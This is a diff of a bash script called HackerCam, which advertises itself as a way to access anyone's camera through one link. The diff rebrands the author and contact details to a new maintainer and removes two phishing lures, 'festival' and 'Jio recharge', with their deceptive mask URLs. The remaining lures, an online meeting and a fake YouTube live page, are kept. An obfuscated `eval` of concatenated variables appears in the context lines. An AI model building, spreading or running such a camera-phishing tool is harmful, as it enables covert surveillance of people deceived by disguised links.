@@ -1,15 +1,14 @@
 #!/bin/bash
 
 # HackerCam
-# Version    : 1.0
-# Author     : k4itrun
-# Github     : https://github.com/k4itrun
-# Email      : k4itrun@6889.fun
-# Telegram   : https//t.me/k4itrun
-# Credits    : LinuxChoice & techchipnet/CamPhish
-# Date       : 20-10-2023
+# Version    : 3.0
+# Author     : chazhub
+# Github     : https://github.com/chazhub
+# Email      : azmimujahid10@gmail.com
+# Telegram   : https//t.me/maliciously666
+# Date       : 17-07-2024
 # License    : MIT
-# Copyright  : k4itrun (2023-202*)
+# Copyright  : chazhub (2024-202*)
 # Language   : Shell
 
 # Utils Colors
@@ -62,8 +61,8 @@ ${green} ███████║███████║██║░░╚═�
 ${lgreen} ██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗██║░░██╗██╔══██║██║╚██╔╝██║
 ${green} ██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║╚█████╔╝██║░░██║██║░╚═╝░██║
 ${lgreen} ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
-${green}                                 ${red}[v1.0]
-${lgreen}                              ${red}[By k4itrun]
+${green}                                 ${blue}[v3.0]
+${lgreen}                              ${blue}[By chazhub]
 "
 
 loclx_help="
@@ -174,7 +173,7 @@ eval "$N0q$x$Hc2$rQW"
     ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
 
                                     MIT License
-                        Copyright (c) 2023-202* k4itrun
+                        Copyright (c) 2024-202* cahzhub
 
     Permission is hereby granted, free of charge, to any person obtaining a copy
     of this software and associated documentation files (the "Software"), to deal
@@ -449,12 +448,9 @@ echo -e "${ask}Please select an option:
 
 ${lgreen}[${white}1${lgreen}] ${bblue}Online Meeting
 ${lgreen}[${white}2${lgreen}] ${bblue}Live Streaming Youtube
-${lgreen}[${white}3${lgreen}] ${bblue}Show Festival
-${lgreen}[${white}4${lgreen}] ${bblue}Jio Recharge
 ${lgreen}[${white}d${lgreen}] ${bblue}Change the image Directory ${white}(${bblue}current: ${red}${FOL}${white})
 ${lgreen}[${white}p${lgreen}] ${bblue}Change the default Port ${white}(${bblue}current: ${red}${PORT}${white})
 ${lgreen}[${white}x${lgreen}] ${bblue}Credits
-${lgreen}[${white}m${lgreen}] ${bblue}See More tools
 ${lgreen}[${white}0${lgreen}] ${bblue}Exit${blue}
 "
 sleep 1
@@ -479,17 +475,6 @@ fi
         printf "$ch_prompt"
         read vid_id
         mask="https://watch-youtube-videos-live"
-        break
-    elif echo $option | grep -q "3"; then
-        dir="festival"
-        echo -e "\n${ask}Enter festival name ${white}(${bblue}Current: ${green}birthday${white}):${blue}"
-        printf "$ch_prompt"
-        read fest_name
-        mask="https://best-wishes-to-you"
-        break
-    elif echo $option | grep -q "4"; then
-         dir="recharge"
-        mask="https://free-399rs-jio-recharge"
         break
     elif echo $option | grep -q "p"; then
         echo -e "\n${ask}Please enter the port:${bblue}"
@@ -523,16 +508,16 @@ fi
 $red[ToolName]  ${bwhite}  :[HackerCam]
 $red[Version]    ${bwhite} :[${version}]
 $red[Description]${bwhite} :[Access anyone's camera using just one link]
-$red[Author]     ${bwhite} :[k4itrun]
-$red[Github]     ${bwhite} :[https://github.com/k4itrun]
-$red[Messenger]  ${bwhite} :[https://t.me/k4itrun]
-$red[Email]      ${bwhite} :[k4itrun@6889.fun]"
+$red[Author]     ${bwhite} :[chazhub]
+$red[Github]     ${bwhite} :[https://github.com/chazhub]
+$red[Messenger]  ${bwhite} :[https://t.me/maliciously666]
+$red[Email]      ${bwhite} :[azmimujahid10@gmail.com]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
         xdg-open "https://github.com/k4itrun/k4itrun#My-Best-Works"
     elif echo $option | grep -q "0"; then
-        echo -e "\n${success}Thanks for using HackerCam (star the repository)!\n"
+        echo -e "\n${success}Thanks for using HackerCam!\n"
         exit 0
     else
         echo -e "\n${error}Input is invalid, please review and correct!\007"
